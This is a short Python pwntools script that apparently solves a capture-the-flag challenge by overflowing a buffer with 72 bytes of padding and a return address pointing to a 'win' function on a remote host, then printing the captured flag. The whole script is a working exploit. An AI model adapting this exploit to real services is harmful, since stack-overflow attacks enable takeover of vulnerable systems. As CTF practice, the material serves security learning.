from pwn import *
import re

r = remote("tcp.ybn.sg", 19020)

win = 0x0000000000401187

payload = b'A' * 72
payload += p64(win)

r.sendlineafter(b'Persuade:', payload)

resp = r.recvall().decode()
r.close()

flag = re.findall(r'(YBN{.+})', resp)[0]
print("Flag:", flag)